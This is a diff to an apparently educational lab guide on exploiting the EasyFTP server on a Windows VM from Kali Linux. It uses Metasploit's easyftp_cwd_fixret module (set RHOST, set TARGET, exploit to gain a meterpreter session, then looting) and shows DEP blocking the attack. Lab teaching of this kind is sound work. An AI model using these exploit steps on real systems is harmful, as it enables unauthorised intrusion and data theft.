@@ -24,9 +24,15 @@ On Windows server VM 🪟
    :: open a command windows, run it as Administrator
    sc delete easyftpbasicsvr
    ```
+   7. Add a user test on EasyFTP
 
+Keep EasyFTP running on Windows VM 🪟.
 On Kali Linux VM 🐧, in a command terminal
 
+```bash
+#  Make sure you can ftp to EasyFTP from Kali terminal
+ftp Windows_VM_IP # as user test
+```
 2. Exploit the Windows target
 
 ```bash
@@ -43,7 +49,7 @@ msf exploit(easyftp_cwd_fixret) > show targets
 
 # 2.3 Exploit the target
 msf exploit(easyftp_cwd_fixret) > set RHOST Windows_VM_IP
-msf exploit(easyftp_cwd_fixret) > set TARGET Number_of_target_Windows_Universal - v1.7.0.11
+msf exploit(easyftp_cwd_fixret) > set TARGET "Number_of_target_Windows_Universal - v1.7.0.11"
 msf exploit(easyftp_cwd_fixret) > exploit # enter meterpreter if succeeded
 
 # 2.4 Loot the target
@@ -85,7 +91,7 @@ On Kali Linux VM 🐧
 
 On Windows server VM 🪟
 
-6. If you see a box pops up saying "ftpbasicsvr.exe has stopped working", then DEP has saved your server by stopping the attack!
+6. If you see a box pops up saying "ftpbasicsvr.exe has stopped working" or EasyFTP crashed, then DEP has saved your server by stopping the attack!
 
 
 # Reference
